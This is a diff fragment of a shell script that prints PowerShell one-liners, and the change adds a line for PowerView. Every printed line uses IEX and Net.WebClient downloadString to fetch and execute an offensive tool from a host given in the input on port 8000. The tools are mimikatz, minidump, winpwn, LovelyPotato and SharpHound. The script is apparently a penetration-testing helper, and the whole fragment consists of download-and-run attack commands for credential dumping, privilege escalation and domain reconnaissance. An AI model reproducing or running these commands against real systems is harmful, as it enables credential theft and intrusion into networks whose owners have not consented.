@@ -55,6 +55,7 @@ while read line
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/minidump.ps1')\""
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/mimikatz.ps1')\""
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/winpwn.ps1')\""
+  echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/PowerShell/powerview.ps1')\""
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/LovelyPotato/lovelypotato.ps1')\""
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/BloodHound/sharphound.ps1')\""
   echo "powershell \"IEX(New-Object Net.WebClient).downloadString('http://$line:8000/BloodHound/sharphound.exe')\""
